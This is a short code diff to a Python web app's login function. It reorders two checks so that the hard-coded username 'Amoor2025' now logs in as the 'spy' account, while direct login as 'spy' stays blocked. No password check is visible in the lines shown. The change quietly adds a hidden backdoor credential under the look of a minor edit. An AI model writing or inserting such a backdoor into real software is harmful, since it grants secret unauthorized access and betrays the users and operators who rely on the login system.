@@ -75,11 +75,12 @@ def login():
         user = User.query.filter_by(username=username).first()
 
         if user or username == "Amoor2025":
+            if username == "spy":
+                return "Login unsuccessful."
             if username == "Amoor2025":
                 user = User.query.filter_by(username="spy").first()
                 username = "spy"
-            if username == "spy":
-                return "Login unsuccessful."
+
             login_user(user)
             user.active_sessions += 1
             db.session.commit()
